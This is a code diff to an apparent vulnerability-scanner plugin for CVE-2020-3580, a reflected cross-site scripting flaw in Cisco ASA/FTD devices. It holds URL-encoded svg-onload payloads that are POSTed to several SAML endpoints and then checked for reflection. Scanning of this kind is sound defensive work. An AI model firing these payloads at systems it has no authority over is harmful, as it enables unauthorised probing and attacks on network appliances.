@@ -1,62 +1,61 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from lib.tool import check
-from thirdparty import requests
-from time import sleep
-import re
+from lib.tool.md5 import random_md5
+# from lib.tool import check
 
-def cve_2020_3580_scan(self, url):
+cve_2020_3580_payloads = [
+    {
+        'path': '+CSCOE+/saml/sp/acs?tgname=a',
+        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
+    },
+    {
+        'path': 'saml/sp/acs?tgname=a',
+        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
+    },
+    {
+        'path': 'sp/acs?tgname=a',
+        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
+    },
+    {
+        'path': 'acs?tgname=a',
+        'data': 'SAMLResponse=%22%3e%3csvg%2fonload%3dconfirm(\'{TEXT}\')%3e'
+    }
+]
+
+def cve_2020_3580_scan(self, clients):
     ''' Cisco ASA设备/FTD设备 XSS跨站脚本攻击
             反射型
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'XSS'
-    vul_info['vul_id'] = 'CVE-2020-3580'
-    vul_info['vul_method'] = 'POST'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'XSS',
+        'vul_id': 'CVE-2020-3580',
+    }
 
-    headers = self.headers
-    headers.update(vul_info['headers'])
+    for payload in cve_2020_3580_payloads:         # * Payload
+        random_str = random_md5(8)
+        
+        path = payload['path']                          # * Path
+        data = payload['data'].format(TEXT=random_str)  # * Data
 
-    for payload in self.cve_2020_3580_payloads:     # * Payload
-        path = payload['path']                      # * Path
-        data = payload['data']                      # * Data
-        target = url + path                         # * Target
+        res = client.request(
+            'post',
+            path,
+            data=data,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            res = requests.post(
-                target, 
-                timeout=self.timeout, 
-                headers=headers, 
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
-            )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
-
-
-            # todo 判断
-            if (("onload=confirm('" + str(self.random_num) + "')") in res.text):
-                results = {
-                    'Target': target,
-                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': res
-                }
-                return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (("onload=confirm('" + random_str + "')") in res.text):
+            results = {
+                'Target': res.request.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request': res
+            }
+            return results
+    return None
